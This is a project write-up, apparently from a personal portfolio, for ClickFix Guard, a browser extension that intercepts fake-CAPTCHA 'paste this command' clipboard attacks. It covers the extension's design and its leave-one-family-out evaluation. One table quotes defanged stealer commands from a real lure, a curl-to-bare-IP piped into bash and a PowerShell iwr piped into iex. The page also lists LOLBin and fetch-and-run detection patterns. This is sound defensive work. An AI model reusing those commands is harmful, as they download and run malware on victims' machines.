@@ -1,0 +1,73 @@
+---
+title: ClickFix Guard
+kind: security
+year: "2026"
+order: 3
+summary: A Chrome and Firefox extension that stops fake-CAPTCHA "paste this command" attacks. When a page secretly copies a malicious command to your clipboard, it never gets there; a harmless note does, and you see why.
+why: After reversing a paste-a-command lure end to end, I wanted the defence that would have stopped it before the victim ever pressed Win+R.
+note: Signed by Mozilla. No network requests, no telemetry; everything runs in the browser.
+cover: /work/clickfix-guard/cover.webp
+stack: [JavaScript, WebExtensions MV3, Chrome + Firefox, Node test runner, CDP, WebDriver BiDi, Vercel]
+repo: https://github.com/samdem-ai/clickfix-guard-extention
+live: https://clickfix-guard-demo.vercel.app
+results:
+  - value: "91.8%"
+    label: of never-seen attack families blocked (leave-one-family-out)
+  - value: "0%"
+    label: benign commands blocked in the same test
+  - value: "59"
+    label: real-browser checks passing in Chromium and Firefox
+  - value: "0"
+    label: network requests or data collected
+---
+
+## The problem
+
+ClickFix (also called fake CAPTCHA or paste-and-run) needs no exploit and no download. The page shows "Verify you are human", copies a command to your clipboard when you click, and tells you to press <kbd>Win</kbd>+<kbd>R</kbd>, <kbd>Ctrl</kbd>+<kbd>V</kbd>, <kbd>Enter</kbd>. Download scanning, SmartScreen and Gatekeeper never see anything, because the victim runs the command themselves.
+
+I took one of these lures apart in ["Free Claude Code" to malware](/en/work/youtube-paste-stealer). The browser is the last place that sees the command before it reaches the OS, so that is where this sits.
+
+## Against the lure I reversed
+
+That campaign didn't even need a fake CAPTCHA: a YouTube description sent people to a Pastebin "installer" with one command per OS, and they copied it themselves. These are the commands from that paste (defanged here), run through ClickFix Guard as regression tests:
+
+| Command from the paste | Verdict |
+| --- | --- |
+| macOS: the real `bun.sh/install`, chained to `/bin/bash -c "$(curl -fsSL hxxp://192.162.199[.]249/9rmoz4cqi58)"` | **Blocked**, even with no page context. The genuine installer in front doesn't excuse the bare-IP stage. |
+| Windows: `iwr "hxxp://soft-storage[.]top/worker?=…/ai-plugin" -UseBasicParsing \| iex` | **Blocked** in every case |
+| Windows, the download line on its own | **Blocked** when the page tells you to run it in PowerShell; a warning without that context |
+
+So copying either command from that paste, with Ctrl+C or a copy button, leaves a harmless note on the clipboard instead of the stealer's first stage.
+
+## What I did
+
+1. **Hook every way a page can copy.** A script in the page's own world wraps `navigator.clipboard`, `setData` in copy events, `execCommand('copy')` on hidden text boxes, and plain Ctrl+C, in every frame, including cross-origin iframes.
+2. **Undo the disguise before judging.** Caret and backtick escapes, string splitting, `[char]` codes, `-f` / `-join` / `-replace` tricks, `-EncodedCommand`, base64, invisible characters, and the padding that pushes the real command out of the Run box. All of it is rebuilt as text; nothing is executed.
+3. **Score it in four layers.** Rules for known LOLBins (mshta, certutil, msiexec, `iex`, `curl | bash`, osascript…), a generic parser that recognises fetch-and-run shapes for tools no rule names, a small on-device classifier (hashed character n-grams, 93 KB, about 0.2 ms per copy), and behaviour signals that don't depend on the payload at all: was the copied text visible, did the button say "Copy" or "Verify", did "press Win+R" instructions appear after the copy?
+4. **Act on it.** A block never reaches the clipboard: a `#` note does, which is harmless in Run, cmd, PowerShell or bash. Uncertain copies get a warning, and the clipboard is cleaned if you leave the browser within 15 seconds. Lures that only show their instructions after the copy are re-checked and cleaned late.
+
+## Architecture
+
+<Pipeline>
+  <Stage label="writeText · setData · execCommand · Ctrl+C" sub="page hook" />
+  <Stage label="decode · deobfuscate" sub="normalise" />
+  <Stage label="rules · parser · classifier · intent" sub="score" />
+  <Stage label="block · warn · late clean-up" sub="act" />
+  <Stage label="warning · badge · local log" sub="report" />
+</Pipeline>
+
+![The live demo with ClickFix Guard blocking a fake CAPTCHA](/work/clickfix-guard/demo.webp)
+
+## Testing it honestly
+
+The classifier was evaluated **leave-one-family-out**: 15 attack families modelled on public ClickFix reporting, and for each one the model is retrained without it and tested on it, with no page context. Rules alone block 81.2%; the fused analyzer blocks 91.8% and flags 98.4%, with no benign command blocked. The first version of the corpus let the model cheat by learning what test addresses look like, so benign samples now use the same address generator.
+
+The extension itself is tested in real browsers: headless Chromium over CDP and Firefox over WebDriver BiDi load it, click the lure pages like a user, and check what actually lands on the clipboard. The signed Firefox package passes as a normal install in release Firefox, and the unsigned one is refused, so signature enforcement was really on.
+
+<Note>The corpus is generated from templates I wrote, not captured samples, so the numbers measure generalisation across the attack styles I modelled. Real-world accuracy will differ, and the next step is replaying real payloads from threat-intel feeds.</Note>
+
+## Results
+
+<Results />
+
+Try it before installing: the [demo](https://clickfix-guard-demo.vercel.app) runs safe, simulated lures that point at addresses that cannot connect, and tells you whether you're protected.
